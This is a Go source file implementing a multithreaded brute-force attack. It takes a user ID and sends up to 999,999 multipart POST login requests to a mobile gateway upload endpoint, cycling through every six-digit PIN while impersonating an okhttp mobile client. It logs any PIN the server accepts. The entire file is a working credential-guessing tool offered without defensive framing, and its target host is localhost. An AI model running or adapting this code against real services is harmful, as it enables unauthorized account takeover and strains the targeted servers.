package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"log"
	"mime/multipart"
	"net/http"
	"strings"
	"os"
)

type Work struct {
	Rq      *http.Request
	Pw string
}

const MAX = 999999
const Threads = 50

var UserId string
var Uri string = "https://branch.localhost/gw/mob/uplFileMul"

func NewRequest(Pw int) (*Work, error) {
	Ret := new(Work)
	body := new(bytes.Buffer)
	w := multipart.NewWriter(body)
	if err := w.WriteField("un", UserId); err != nil {
		return Ret, err
	}
	pw := fmt.Sprintf("%06d", Pw)
	if err := w.WriteField("pwd", pw); err != nil {
		return Ret, err
	}
	if err := w.Close(); err != nil {
		return Ret, err
	}
	Rq, err := http.NewRequest("POST", Uri, body)
	if err != nil {
		return Ret, err
	}
	Rq.Header.Set("User-Agent", "okhttp/3.14.9")
	Ret.Rq = Rq
	Ret.Pw = pw
	return Ret, nil
}

func Do(Jobs <-chan *Work, Return chan<- error) {
	Client := new(http.Client)
	for w := range Jobs {
		R, err := Client.Do(w.Rq)
		if err != nil {
			Return <- err
		}
		body, err := ioutil.ReadAll(R.Body)
		if err != nil {
			Return <- err
		}
		R.Body.Close()
		b := string(body)
		if !strings.Contains(b, "err") {
			log.Println(w.Pw)
		}
		Return <- nil
	}
}

func main() {
	if len(os.Args) > 1 {
		UserId = os.Args[1]
	} else {
		fmt.Printf("A UserId must be supplied.\nUsage:\n\n\t%s <UserId>\n\n", os.Args[0])
		return
	}
	Jobs := make(chan *Work, Threads)
	Return := make(chan error)

	for i := 0; i < Threads; i++ {
		go Do(Jobs, Return)
	}
	go func() {
		for i := 0; i < MAX; i++ {
			Rq, err := NewRequest(i)
			if err != nil {
				Return <- err
			}
			Jobs <- Rq
		}
	}()
	for i:=0; i<MAX; i++ {
		if err := <-Return;	err != nil {
			log.Fatalln(err)
		}
	}
	close(Jobs)
	close(Return)
}
